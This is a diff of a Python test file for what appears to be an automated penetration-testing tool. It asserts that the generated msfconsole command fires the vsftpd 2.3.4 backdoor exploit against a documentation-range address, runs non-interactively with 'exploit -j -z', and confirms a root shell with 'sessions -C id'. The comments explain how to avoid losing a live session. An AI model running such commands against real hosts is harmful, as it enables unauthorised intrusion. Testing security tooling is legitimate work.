@@ -38,7 +38,15 @@ def test_builds_use_set_rhosts_run():
     c = cap["command"]
     assert "use exploit/unix/ftp/vsftpd_234_backdoor" in c
     assert "set RHOSTS 203.0.113.3" in c
-    assert "run" in c and "exit" in c
+    # Fire NON-INTERACTIVELY: `exploit -j -z` runs as a backgrounded job and never
+    # drops into the session shell. Bare `run` hangs the batch `-x` invocation on a
+    # SUCCESSFUL pop (the session opens and msfconsole waits at its prompt until the
+    # timeout kills it — observed live 2026-08-18), losing the session entirely.
+    assert "exploit -j -z" in c
+    # Prove the pop in the same non-interactive run: `id` on every opened session
+    # emits uid=0(root), which breach_confirmed recognizes as real shell evidence.
+    assert "sessions -C id" in c
+    assert c.rstrip().endswith('exit"')   # exit is the last msf command in the -x resource
 
 
 def test_private_quiet_dbless_no_daemon(monkeypatch):
